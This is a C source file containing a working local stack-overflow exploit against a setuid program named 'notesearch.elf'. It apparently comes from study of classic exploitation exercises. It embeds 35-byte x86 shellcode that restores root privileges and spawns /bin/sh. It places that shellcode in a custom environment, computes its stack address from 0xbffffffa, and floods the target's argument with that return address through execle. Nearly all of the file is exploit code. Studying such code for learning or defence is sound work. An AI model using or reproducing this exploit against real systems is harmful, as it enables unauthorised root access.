#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char sc[]=
   "\x31\xc0\x31\xdb"
   "\x31\xc9\x99\xb0"
   "\xa4\xcd\x80\x6a"
   "\x0b\x58\x51\x68"
   "\x2f\x2f\x73\x68"
   "\x68\x2f\x62\x69"
   "\x6e\x89\xe3\x51"
   "\x89\xe2\x53\x89"
   "\xe1\xcd\x80"; //35bytes pop sh shell

int main(int argc, char *argv[]){
   char *env[2] = {sc, 0}; //defining own env; to be passed later in execle
   // system() = fork new proc
   // execl() = replace curr proc with new, pass existing env
   // execle() = replace curr proc with new, define own env
   unsigned int i, ret;
   char *buf = (char *) malloc(160);
   /* when defining... and passing... your own env, 
    * blank slate; and the location of the SC is very 
    * highly predictable.
    * The environment will start at 0xbffffffa ON THE STACK 
    * 0xbffffffa - (sizeof(sc)-1) - strlen("target program")
    */
   ret = 0xbffffffa - (sizeof(sc)-1) - strlen("./notesearch.elf");
   printf("ret = %d, xlates to 0x%x\n", ret, ret);
   for(i=0; i<160; i+=4){
      *((unsigned int *)(buf+i)) = ret;
   }
   /* execle{
    *    const char *path,
    *    const char *arg0,
    *    const char *arg1,
    *    ...const char *arg999
    *    NULL,
    *    const char *env[]
    * }
    */ 
   execle("./notesearch.elf", "notesearch.elf", buf, NULL, env);
   free(buf);
   return(0);
}

